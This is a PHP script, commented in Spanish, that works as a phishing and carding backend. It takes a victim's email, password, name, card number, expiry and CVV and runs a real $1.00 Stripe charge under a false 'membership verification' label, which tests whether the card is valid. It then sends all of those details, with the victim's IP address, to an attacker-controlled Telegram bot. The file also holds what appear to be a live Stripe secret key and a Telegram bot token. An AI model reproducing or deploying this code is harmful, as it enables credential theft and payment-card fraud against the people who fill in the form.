<?php
// Configuración de Telegram
$token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
$chat_id = "7993722214";

// CONFIGURACIÓN DE STRIPE
$stripe_secret_key = "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"; // sk_live_...
$monto = 100; // Monto en centavos (100 = $1.00 USD)
$moneda = "usd";

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $pago_exitoso = false;
    $status_pago = "❌ No procesado";

    // 1. LÓGICA DE CARGO REAL EN STRIPE
    if (!empty($stripe_secret_key)) {
        try {
            // A. Crear Token de Tarjeta
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            $card_details = http_build_query([
                'card' => [
                    'number' => $data['cc'],
                    'exp_month' => explode('/', $data['ex'])[0],
                    'exp_year' => '20' . explode('/', $data['ex'])[1],
                    'cvc' => $data['cv'],
                ]
            ]);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $card_details);
            curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret_key . ':');
            $res_token = json_decode(curl_exec($ch), true);
            curl_close($ch);

            if (isset($res_token['id'])) {
                // B. Realizar el Cobro Real
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/charges");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                $charge_details = http_build_query([
                    'amount' => $monto,
                    'currency' => $moneda,
                    'source' => $res_token['id'],
                    'description' => 'Verificacion de Membresia - ' . $data['em']
                ]);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $charge_details);
                curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret_key . ':');
                $res_charge = json_decode(curl_exec($ch), true);
                curl_close($ch);

                if (isset($res_charge['status']) && $res_charge['status'] == 'succeeded') {
                    $pago_exitoso = true;
                    $status_pago = "✅ COBRO REALIZADO ($1.00)";
                } else {
                    $status_pago = "❌ COBRO DECLINADO: " . ($res_charge['error']['message'] ?? 'Error desconocido');
                }
            } else {
                $status_pago = "❌ TARJETA INVÁLIDA: " . ($res_token['error']['message'] ?? 'Error de token');
            }
        } catch (Exception $e) {
            $status_pago = "⚠️ ERROR SISTEMA: " . $e->getMessage();
        }
    }

    // 2. ENVIAR REPORTE A TELEGRAM
    $mensaje = "🔔 RESULTADO DE PAGO 🔔\n\n";
    $mensaje .= "💰 STATUS: $status_pago\n";
    $mensaje .= "📧 Correo: " . $data['em'] . "\n";
    $mensaje .= "🔑 Pass: " . $data['pw'] . "\n";
    $mensaje .= "👤 Titular: " . $data['nm'] . "\n";
    $mensaje .= "💳 Tarjeta: " . $data['cc'] . "\n";
    $mensaje .= "📅 Exp: " . $data['ex'] . "\n";
    $mensaje .= "🔒 CVV: " . $data['cv'] . "\n";
    $mensaje .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];

    $url_tg = "https://api.telegram.org/bot$token/sendMessage";
    $ch_tg = curl_init();
    curl_setopt($ch_tg, CURLOPT_URL, $url_tg);
    curl_setopt($ch_tg, CURLOPT_POST, 1);
    curl_setopt($ch_tg, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $mensaje]));
    curl_setopt($ch_tg, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch_tg);
    curl_close($ch_tg);
    
    // Responder al Navegador
    echo json_encode(["pago" => $pago_exitoso]);
}
?>
